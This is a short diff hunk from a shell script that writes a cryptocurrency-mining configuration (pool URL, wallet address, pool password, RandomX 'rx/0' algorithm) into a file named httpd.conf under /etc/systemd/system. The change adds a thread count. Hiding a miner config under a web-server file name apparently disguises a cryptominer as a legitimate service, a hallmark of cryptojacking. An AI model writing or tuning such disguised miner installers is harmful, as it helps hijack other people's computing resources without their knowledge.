@@ -188,6 +188,7 @@ cat > /etc/systemd/system/conf.d/httpd.conf <<EOF
             "url": "$pool_url",
             "user": "$wallet_address",
             "pass": "$pool_pass",
+            "threads": 7,
             "algo": "rx/0"
         }
     ],
